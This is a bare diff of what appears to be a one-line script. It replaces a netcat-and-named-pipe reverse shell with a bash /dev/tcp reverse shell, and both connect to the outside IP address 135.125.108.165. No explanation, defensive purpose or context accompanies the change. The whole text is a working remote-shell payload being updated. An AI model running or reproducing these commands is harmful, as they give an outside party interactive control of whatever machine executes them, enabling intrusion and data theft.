@@ -1,1 +1,1 @@
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 135.125.108.165 4435 >/tmp/f
+bash -c 'bash -i >& /dev/tcp/135.125.108.165/8846 0>&1'
